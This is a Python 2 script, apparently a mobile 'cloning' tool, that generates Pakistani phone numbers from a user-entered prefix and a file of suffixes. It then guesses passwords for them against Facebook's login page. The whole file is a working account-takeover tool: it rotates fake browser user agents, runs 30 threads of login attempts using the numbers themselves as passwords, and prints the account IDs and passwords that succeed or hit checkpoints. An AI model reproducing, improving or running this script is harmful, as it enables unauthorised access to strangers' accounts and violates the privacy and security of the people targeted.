#coding=utf-8
#!/usr/bin/python2
try:
    import os
    import sys
    import time
    import re
    import threading
    import json
    import getpass
    import urllib
    import random
    import requests
    import subprocess
    import hashlib
    import cookielib
    import bs4
    import platform
    import base64
    import marshal
    import uuid
    import concurrent.futures
    from getmac import get_mac_address as gma
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from concurrent.futures import ThreadPoolExecutor as YayanGanteng
    from datetime import datetime
except ImportError:
    os.system('pip2 install futures')
    os.system('pip2 install requests')
    os.system('termux-setup-storage -y')
    os.system("pip2 install get_mac")
    os.system('pip2 install requests bs4')
    os.system('pkg update && pkg upgrade')
    os.system("exit")

agents = ['Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; Nexus S 4G Build/IMM26) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
 'Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; Nexus S Build/JRO03L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
 'Mozilla/5.0 (Linux; U; Android 4.1.1; es-us; Nexus S 4G Build/JRO03R) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
 'Mozila/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723',
 'Mozila/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2',
 'Mozila/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807',
 'Mozila/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36',
 'Mozila/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1#2.0#TCL/TCL-EU-RT2841-S1/28/tclwebkit1.0.2/1920*1080(560524790,null;224129727,9fc89527700f4106b1fe6ca1dc41d2fa)']

logo = ""

def ran2():
    id=[]
    cps=[]
    oks=[]
    lps=[]
    os.system("clear")
    r_s = ""
    if r_s =="":
        os.system("clear")
        print (logo)
        print("Put 3 digit random number ")
        print
        print(" ➤ Only 3 digit input")
        print
        c = raw_input(" ➤ Number : \033[0;97m ")
        k = "+92"
        try:
            file = (".txt")
            for line in open(file, "r").readlines():
                id.append(line.strip())
        except IOError:
            print("\033[1;92mFile Not Found")
            raw_input("\033[1;92mPress Enter To Back")
            ran2()
    else:
        print("")
        print("\033[1;91mSelect Valid Option")
        time.sleep(1)
        ran2()
    zzz = str(len(id))
    os.system("clear")
    print logo;time.sleep(0.5)
    print(" ➤ Total numbers: "+zzz);time.sleep(0.5)
    print(" ➤ The cloning process has been started");time.sleep(0.5)
    print 47*("-")
    print("")
    def main(arg):
        global ua
        user=arg
        #i = s+c+user
        #o = i[:15:]
        #p = i+o
        #wid = c+user
        #widd = = wid[::-1]
        #to = user[::-1]
        url = "https://free.facebook.com"
        ua = random.choice(agents)
        try:
            pass1 = user
            ses = requests.Session()
            ged = ses.get("https://free.facebook.com")
            rex = ses.post("https://free.facebook.com/login.php", data={"email": k+c+user,"pass": pass1,"login": "submit"}, headers={"user-agent": ua})
            xo = rex.url
            print ('\x1b[1;33m[BABA-OK] \x1b[1;33m' + k+c+user + ' | ' + pass1 +'\x1b[0;97m')
            if "c_user" in ses.cookies.get_dict().keys():
                cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                cid=cookie[7:22]
                print ('\x1b[1;33m[BABA-OK] \x1b[1;33m' + cid + ' | ' + pass1 +'\x1b[0;97m')
                oks.append(cid + pass1)
            elif "checkpoint" in ses.cookies.get_dict().keys():
                cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                cid=cookie[24:39]
                print ('\x1b[1;32m[BABA-CP] \x1b[1;32m' + cid + ' | ' + pass1 +'\x1b[0;97m')
                cps.append(cid + pass1)
            else:
                pass2 = k[:1]+c+user
                ses = requests.Session()
                ged = ses.get("https://free.facebook.com")
                rex = ses.post("https://free.facebook.com/login.php", data={"email": k+c+user,"pass": pass2,"login": "submit"}, headers={"user-agent": ua})
                xo = rex.url
                if "c_user" in ses.cookies.get_dict().keys():
                    cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    cid=cookie[7:22]
                    print('\x1b[1;33m[BABA-OK] \x1b[1;33m' + cid + ' | ' + pass2 +'\x1b[0;97m')
                    oks.append(cid + pass2)
                elif "checkpoint" in ses.cookies.get_dict().keys():
                    cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    cid=cookie[24:39]
                    print ('\x1b[1;32m[BABA-SUCESSFULL] \x1b[1;32m' + cid + ' | ' + pass2 +'\x1b[0;97m')
                    cps.append(cid + pass2)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print(47*"-")
    print("")
    print("\033[1;96mThe process has been completed")
    print("\033[1;92mTotal Ok/Cp/TL: "+str(len(oks))+"/"+str(len(cps))+"/"+str(len(lps)))
    print(47*"\033[1;97m-")
    print("")
    raw_input("\033[1;92mPress enter to back\033[0;97m")
    os.system("exit")
    
if __name__ == '__main__':
	ran2()
